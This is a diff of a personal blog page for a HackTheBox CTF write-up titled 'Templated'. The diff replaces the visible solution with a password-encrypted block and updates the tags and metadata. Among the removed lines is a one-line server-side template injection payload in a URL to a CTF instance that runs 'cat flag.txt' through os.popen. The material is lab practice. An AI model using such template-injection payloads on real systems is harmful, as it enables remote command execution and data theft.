@@ -20,21 +20,18 @@
     var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Can you exploit this simple mistake?">
+  <meta name="description" content="活跃机器">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HackTheBox-CTF-Templated">
 <meta property="og:url" content="http://atsud0.me/2021/04/11/HackTheBox-CTF-Templated/index.html">
 <meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
-<meta property="og:description" content="Can you exploit this simple mistake?">
+<meta property="og:description" content="活跃机器">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://images.atsud0.me/images/post/20210411-14:19:02-_nq9Z0h_dKlHrF.png">
-<meta property="og:image" content="https://images.atsud0.me/images/post/20210411-14:19:21-_t3r1gP_jGwF0r.png">
-<meta property="og:image" content="https://images.atsud0.me/images/post/20210411-14:22:13-_flcyqD_kPIUpO.png">
 <meta property="article:published_time" content="2021-04-11T06:25:42.000Z">
-<meta property="article:modified_time" content="2021-04-11T06:25:42.899Z">
+<meta property="article:modified_time" content="2021-04-14T05:33:08.255Z">
 <meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://images.atsud0.me/images/post/20210411-14:19:02-_nq9Z0h_dKlHrF.png">
 
 <link rel="canonical" href="http://atsud0.me/2021/04/11/HackTheBox-CTF-Templated/">
 
@@ -145,7 +142,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">181</span></a>
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">182</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -239,6 +236,26 @@
 
               <time title="Created: 2021-04-11 14:25:42" itemprop="dateCreated datePublished" datetime="2021-04-11T14:25:42+08:00">2021-04-11</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-14 13:33:08" itemprop="dateModified" datetime="2021-04-14T13:33:08+08:00">2021-04-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
 
           
             <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
@@ -272,16 +289,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>Can you exploit this simple mistake?</p>
-<a id="more"></a>
-
-
-
-<p><img src="https://images.atsud0.me/images/post/20210411-14:19:02-_nq9Z0h_dKlHrF.png" alt="20210411-14:19:02-_nq9Z0h_dKlHrF"></p>
-<p><img src="https://images.atsud0.me/images/post/20210411-14:19:21-_t3r1gP_jGwF0r.png" alt="20210411-14:19:21-_t3r1gP_jGwF0r"></p>
-<p><img src="https://images.atsud0.me/images/post/20210411-14:22:13-_flcyqD_kPIUpO.png" alt="20210411-14:22:13-_flcyqD_kPIUpO"></p>
-<p>浏览器访问</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;138.68.182.108:31553&#x2F;&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+        <div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="310e4cb4bc32a001d2c312bd30e137061c69bdcb73784ab5ffed6257abe6cc0f">3c24bcd5cd692a6c711bb4a78f701ebf9805a9bab804cc0ed14c57edd387f282039bd5be4922409dd53fea9f0cc4fb5f8a344dbd1edb69b741f490487c28c3f7a8c449307606d0bb302dff146d3ac2fa24c578915bf4ce4cc77f174ce20b4f7f916128bdaf7d1e5d154acdb6644381ed27ba5d5223a951c6e45ad961c11c5386cbc0ef1ec56192eb1d07f048c40abdb16410586396c1c6c158614014d6c76b7aaff0047c043bc97f9b7c9333b31092fff23e415942dde0c18c81bc520d6a1d44d2009eba720165d28aae8f97269e36f7880da9dcd2a9053192f96a66ff78cad7d5ff7bbe2576ea4e0a1d2bb21e2b98908b9d9304bf3a27069a73863bd61a0f8be5eb31bbe625d28713de1cb8e0e081bcb2ee44f2a9471edae330063ee55b11d0f140cb6ff34b55fa833b67fdf75c377f430f089e30bd018eec9f134571c7de1647b2e00de22c21b7041db60622eb15ef8b314cba300ff98367ce213cd67db23a2e86cd1f63a3dd23900d0a756d5c25775a9c548eb5254e61bb0e2978b842612a0310a85c7e0610142a4680e3a553c170de931e7c4b4e563f848d4ec8bf8e9129781745c40e3a14680b4671c8fd2c2eb1d7a26417066f3f07b255632d4894c4772ecbf0c64668ca2618077a330242e4baa830d6f166fd0e8a4d3c90349ac907d3bac4533b6abeb07b4ee727f1f95811c26750a8420c8dc26c65ab8cfd384ddf4e3440a83f3789b3d9caf5954d2575e4518be82fba12b688b077cba1745d6a6e6b472de960797d9fe3540402a78d9a1723bbafc6bae018e149dd28a885bae5992630b3384de4e1c5ddf1b8a70ef3d4d54d4514dcc1062ef1acd72a70a13351dc09197d0a1689cf06f91f9baf2300709e4dd2a5815760f7b7c5dc185824984aba143fa87220db44ca9daa7359436fa0f05467220d8d1add1e1c81ba9bfc1a3d6e9f0cddccb18ec3a1870097de72dc64df1ede3802b04343fc887feeba4ef80ead215a6848f869392a1983f2f2b6094c45cd00f36fa13130e578a9f7423051606f705bc34733a33f2e7f7611421e7317865e178ac987e8bb468787af6e920b67e44cb4d95109471b1e543b19aa45ee0158a789dbd9d4c4ab7679c9f48c0d1e62008567fd2b9e37ec56f1addf0188ae933442bb46cf4d4ea8f91e434b8c04716258ec94045d12e64aa044d74af7291e9681ed4e777c04085c50c1e587b4722b88f848d7c39258c5a6979ebf686f9340439b295b23cd9bbc49f387bc325d5c844dff4bb0d33d81bbe68c39641f6963b409db9e90612d619c0e4c75677458fd28127e07229c5d243b23c1d6568b5e1cac6c4bfca90e836ddf2cc6c6689ccf9bcea3678d5627f40c7e02f772e57d9e1a8af27de05fb4f0568b40b89ab3078d09857f09e03178b46a212a056e66f7cb98d777702cd87e304cbe9c07e2d15f2f7f19de6d2622293044c4f5e0cf0a0c647ee0e5f0493b494028d830d5c24cf006d41b4ef83847c50b9d3fe2f432eccab3bd8bc74efb2fa6512560c73bed9fb2e078eed4a04e3aa1ab1cb64bc2ad5bae38ece2c54057525a952b267736ccbdc1b89b1be34d908e7dd63e2195e8f5448548e8f6a27cee</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -306,6 +314,10 @@
 
 
       <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          </div>
 
         
 
@@ -406,7 +418,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/index.html">
           
-        <span class="site-state-item-count">181</span>
+        <span class="site-state-item-count">182</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
